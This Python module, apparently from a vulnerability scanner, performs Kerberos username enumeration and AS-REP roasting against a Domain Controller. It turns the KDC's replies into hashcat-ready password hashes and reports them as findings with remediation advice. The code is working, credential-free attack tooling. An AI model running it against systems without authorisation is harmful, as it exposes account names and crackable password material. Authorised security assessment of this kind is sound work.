"""HEAVEN — Kerberos pre-authentication probe (user enumeration + AS-REP roasting).

Kerberos leaks account existence before any credential is presented: an AS-REQ
sent without pre-authentication returns a distinct KDC error for a real account
(``KDC_ERR_PREAUTH_REQUIRED``) versus a non-existent one
(``KDC_ERR_C_PRINCIPAL_UNKNOWN``). This lets a scanner validate usernames against
a Domain Controller knowing nothing but its IP and the domain name — the
``kerbrute`` / ``GetNPUsers`` technique — and, crucially, catch accounts that have
"do not require Kerberos pre-authentication" set: for those the KDC returns a full
AS-REP whose encrypted part is offline-crackable (AS-REP roasting).

This complements ``ad_scanner``'s LDAP-based AS-REP check, which needs an
authenticated bind to read ``userAccountControl``. The Kerberos path needs no
credentials at all, so it still works on a locked-down DC reachable only on
88/tcp.

Safety: an AS-REQ *without* a pre-auth timestamp carries no password guess, so a
``KDC_ERR_PREAUTH_REQUIRED`` response does not increment the account's
``badPwdCount`` — enumeration here cannot lock accounts out. The probe never
attempts authentication, only enumerates and captures roastable material.
"""

from __future__ import annotations

import asyncio
import datetime
import random
import secrets
import socket
from typing import Optional

from heaven.utils.logger import get_logger

logger = get_logger(__name__)

try:
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import (
        AS_REQ, AS_REP, KRB_ERROR, KERB_PA_PAC_REQUEST, seq_set, seq_set_iter,
    )
    from impacket.krb5.kerberosv5 import sendReceive, KerberosError
    from impacket.krb5.types import Principal, KerberosTime
    from pyasn1.codec.der import decoder, encoder
    from pyasn1.type.univ import noValue
    HAS_KRB = True
except Exception:  # impacket / pyasn1 not available
    HAS_KRB = False

# A compact seed of common Active Directory account names to validate when the
# caller has no better list. The real value comes from ``extra_users`` (names the
# LDAP layer already enumerated); this seed just makes a credential-free scan of a
# DC-by-IP produce signal. Kept focused on admin/service accounts most likely to
# exist or be AS-REP roastable, so the probe stays small and quiet.
_SEED_USERNAMES: tuple[str, ...] = (
    "administrator", "admin", "guest", "krbtgt", "backup", "backupadmin",
    "service", "svc", "svc_sql", "sqlsvc", "sql", "mssql", "ldap", "http",
    "web", "webadmin", "helpdesk", "support", "test", "operator", "printsvc",
    "exchange", "sharepoint", "iis", "ftp",
)

# Distinct KDC error codes we key on.
_ERR_PREAUTH_REQUIRED = 25    # KDC_ERR_PREAUTH_REQUIRED  → account EXISTS
_ERR_PRINCIPAL_UNKNOWN = 6    # KDC_ERR_C_PRINCIPAL_UNKNOWN → account does not exist
_ERR_CLIENT_REVOKED = 18      # KDC_ERR_CLIENT_REVOKED → exists but disabled/locked


def _build_asreq_no_preauth(username: str, domain_upper: str) -> bytes:
    """Encode an AS-REQ for ``username`` with no pre-authentication (RC4 requested
    so a roastable reply is in the classic crackable etype)."""
    client = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    server = Principal(f"krbtgt/{domain_upper}",
                       type=constants.PrincipalNameType.NT_PRINCIPAL.value)

    as_req = AS_REQ()
    as_req["pvno"] = 5
    as_req["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)

    pac_request = KERB_PA_PAC_REQUEST()
    pac_request["include-pac"] = True
    as_req["padata"] = noValue
    as_req["padata"][0] = noValue
    as_req["padata"][0]["padata-type"] = int(
        constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
    as_req["padata"][0]["padata-value"] = encoder.encode(pac_request)

    req_body = seq_set(as_req, "req-body")
    opts = [constants.KDCOptions.forwardable.value,
            constants.KDCOptions.renewable.value,
            constants.KDCOptions.proxiable.value]
    req_body["kdc-options"] = constants.encodeFlags(opts)
    seq_set(req_body, "sname", server.components_to_asn1)
    seq_set(req_body, "cname", client.components_to_asn1)
    req_body["realm"] = domain_upper
    till = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
    req_body["till"] = KerberosTime.to_asn1(till)
    req_body["rtime"] = KerberosTime.to_asn1(till)
    req_body["nonce"] = random.SystemRandom().getrandbits(31)
    seq_set_iter(req_body, "etype",
                 (int(constants.EncryptionTypes.rc4_hmac.value),
                  int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                  int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value)))
    return encoder.encode(as_req)


def _format_asrep_hash(rep_bytes: bytes, username: str, domain_upper: str) -> Optional[str]:
    """Extract a hashcat-format ``$krb5asrep$`` string from an AS-REP.

    Handles both the classic RC4 case (hashcat mode 18200) and the AES128/AES256
    cases (mode 32100 / 19700), matching impacket ``GetNPUsers``'s own hashcat
    layout so the captured material feeds straight into hashcat/john. Returns
    None only when the buffer is not a decodable AS-REP or carries an etype we do
    not format."""
    try:
        rep = decoder.decode(rep_bytes, asn1Spec=AS_REP())[0]
        etype = int(rep["enc-part"]["etype"])
        cipher = bytes(rep["enc-part"]["cipher"].asOctets())
        if etype == int(constants.EncryptionTypes.rc4_hmac.value):  # 23
            return (f"$krb5asrep$23${username}@{domain_upper}:"
                    f"{cipher[:16].hex()}${cipher[16:].hex()}")
        if etype in (17, 18):  # aes128-cts / aes256-cts — trailing 12 bytes = checksum
            return (f"$krb5asrep${etype}${username}${domain_upper}$"
                    f"{cipher[-12:].hex()}${cipher[:-12].hex()}")
        return None
    except Exception:
        return None


def _probe_one(username: str, domain_upper: str, kdc_host: str) -> dict:
    """Send one AS-REQ and classify the KDC's response. Returns a small dict:
    ``{state: exists|absent|roastable|revoked|error, hash?: str}``."""
    try:
        message = _build_asreq_no_preauth(username, domain_upper)
    except Exception:
        return {"state": "error"}
    try:
        reply = sendReceive(message, domain_upper, kdc_host)
    except KerberosError as e:
        code = e.getErrorCode()
        if code == _ERR_PREAUTH_REQUIRED:
            return {"state": "exists"}
        if code == _ERR_PRINCIPAL_UNKNOWN:
            return {"state": "absent"}
        if code == _ERR_CLIENT_REVOKED:
            return {"state": "revoked"}
        return {"state": "error", "code": code}
    except Exception:
        return {"state": "error"}
    # CRITICAL: impacket's sendReceive() does NOT raise for KDC_ERR_PREAUTH_REQUIRED
    # — it returns the raw KRB-ERROR bytes, because that error is the *expected*
    # first response in a normal TGT exchange (the client then retries WITH a
    # pre-auth timestamp). So a returned buffer is NOT necessarily an AS-REP: it is
    # either a real ticket (the account has DONT_REQUIRE_PREAUTH set → AS-REP
    # roastable) OR that swallowed pre-auth-required error (the account exists and
    # IS protected). Decode as KRB-ERROR first to tell them apart — without this,
    # every pre-auth-required account is mis-reported as roastable (a serious false
    # positive confirmed live against a real KDC). Mirrors impacket GetNPUsers'
    # own KRB_ERROR-vs-AS_REP discrimination.
    try:
        decoder.decode(reply, asn1Spec=KRB_ERROR())[0]
    except Exception:
        # not a KRB-ERROR → fall through and confirm it is a real AS-REP
        logger.debug("reply did not decode as KRB-ERROR; checking for AS-REP", exc_info=True)
    else:
        return {"state": "exists"}  # swallowed PREAUTH_REQUIRED → account is protected
    # Not a KRB-ERROR. Only call it roastable when the buffer is a *decodable*
    # AS-REP: a truncated or malformed reply (garbage off the wire, a middlebox
    # banner, a partial read) must never be reported as a crackable ticket — that
    # would be a high-severity false positive on bytes we never parsed.
    try:
        decoder.decode(reply, asn1Spec=AS_REP())[0]
    except Exception:
        logger.debug("reply decoded as neither KRB-ERROR nor AS-REP", exc_info=True)
        return {"state": "error"}
    # A genuine AS-REP came back → the account does not require pre-auth.
    h = _format_asrep_hash(reply, username, domain_upper)
    return {"state": "roastable", "hash": h}


async def kerberos_preauth_probe(domain: str, dc_host: str,
                                 extra_users: Optional[list[str]] = None,
                                 max_users: int = 40,
                                 timeout: float = 5.0) -> list[dict]:
    """Enumerate accounts + detect AS-REP-roastable ones against ``dc_host``.

    Returns a list of finding dicts in the standard HEAVEN schema. Empty when
    impacket/pyasn1 is unavailable, the domain is unknown, or the KDC is
    unreachable.
    """
    if not HAS_KRB:
        logger.debug("impacket/pyasn1 unavailable: Kerberos pre-auth probe skipped")
        return []
    if not domain or not dc_host:
        return []

    domain_upper = domain.upper()
    # Build a bounded, de-duplicated candidate list (caller-supplied names first).
    seen: set[str] = set()
    candidates: list[str] = []
    for u in list(extra_users or []) + list(_SEED_USERNAMES):
        u = (u or "").strip()
        key = u.lower()
        if u and key not in seen:
            seen.add(key)
            candidates.append(u)
        if len(candidates) >= max_users:
            break

    # A high-entropy name that cannot correspond to a real account. It is used as
    # an enumeration-oracle control: a KDC that leaks account existence answers
    # PRINCIPAL_UNKNOWN ("absent") for a name this random. If instead it classifies
    # the canary the same way it classifies the real candidates (PREAUTH_REQUIRED,
    # i.e. "exists"), its errors do not distinguish real from fake accounts, so the
    # enumeration oracle is not actually working and any "valid user" list would be
    # fabricated. Probed separately from ``candidates`` so it never pollutes counts.
    canary = "zz" + secrets.token_hex(12)

    def _run() -> tuple[list[tuple[str, dict]], dict]:
        results: list[tuple[str, dict]] = []
        old_timeout = socket.getdefaulttimeout()
        socket.setdefaulttimeout(timeout)
        try:
            for user in candidates:
                results.append((user, _probe_one(user, domain_upper, dc_host)))
            canary_res = _probe_one(canary, domain_upper, dc_host)
        finally:
            socket.setdefaulttimeout(old_timeout)
        return results, canary_res

    try:
        results, canary_res = await asyncio.to_thread(_run)
    except Exception:
        logger.debug("Kerberos probe thread failed", exc_info=True)
        return []

    valid_users: list[str] = []
    roastable: list[dict] = []
    for user, res in results:
        state = res.get("state")
        if state in ("exists", "revoked"):
            valid_users.append(user)
        elif state == "roastable":
            valid_users.append(user)
            roastable.append({"username": user, "hash": res.get("hash")})

    findings: list[dict] = []

    # If we never got a single conclusive response the KDC was probably
    # unreachable/filtered — say nothing rather than invent an enumeration finding.
    conclusive = [r for _, r in results if r.get("state") in
                  ("exists", "absent", "revoked", "roastable")]
    if not conclusive:
        return []

    # Suppress the enumeration finding when the oracle is unreliable: a KDC that
    # returns an "exists"-class response for the known-nonexistent canary is not
    # leaking account existence, so the valid-user list cannot be trusted. The
    # AS-REP-roasting findings below are unaffected — a genuine AS-REP cannot be
    # forged for an account the KDC holds no key for, so they stand on their own.
    oracle_masked = canary_res.get("state") in ("exists", "revoked", "roastable")
    if oracle_masked:
        logger.debug(
            "Kerberos enumeration oracle masked (canary classified as %s); "
            "suppressing user-enumeration finding", canary_res.get("state"))

    if valid_users and not oracle_masked:
        findings.append({
            "target": dc_host,
            "vuln_type": "kerberos_user_enumeration",
            "severity": "low",
            "title": f"Kerberos pre-auth username enumeration ({len(valid_users)} valid)",
            "description": (
                "The Domain Controller returns distinct Kerberos errors for existing "
                "versus non-existent accounts, so valid usernames can be enumerated "
                "before authentication with no credentials and no lockout risk. "
                f"{len(valid_users)} candidate name(s) were confirmed to exist. This "
                "hands an attacker a validated user list to feed password spraying "
                "and AS-REP roasting."),
            "confidence": 0.9,
            "remediation": (
                "Username enumeration is inherent to Kerberos, so treat account "
                "names as semi-public: enforce a strong password policy and lockout, "
                "monitor for pre-auth failures / TGT requests, and prefer "
                "non-guessable service-account names."),
            "mitre_technique": "T1087.002 · Account Discovery: Domain Account",
            "evidence": {"valid_users": valid_users[:50],
                         "valid_count": len(valid_users),
                         "candidates_tested": len(candidates)},
        })

    for acct in roastable:
        ev = {"username": acct["username"], "method": "kerberos_as_req_no_preauth"}
        if acct.get("hash"):
            ev["krb5asrep_hash"] = acct["hash"]
        findings.append({
            "target": dc_host,
            "vuln_type": "asrep_roasting",
            "severity": "high",
            "title": f"AS-REP roasting: '{acct['username']}' does not require pre-auth",
            "description": (
                f"Account '{acct['username']}' has 'do not require Kerberos "
                "pre-authentication' set, so the KDC returned an AS-REP whose "
                "encrypted portion is encrypted with the account's password-derived "
                "key. An attacker can crack it offline to recover the plaintext "
                "password, with no interaction and no lockout risk."),
            "confidence": 0.95,
            "remediation": (
                "Disable 'do not require Kerberos pre-authentication' on this "
                "account (clear the DONT_REQ_PREAUTH userAccountControl flag) and "
                "set a long, random password if it is a service account."),
            "mitre_technique": "T1558.004 · Steal or Forge Kerberos Tickets: AS-REP Roasting",
            "evidence": ev,
        })

    return findings
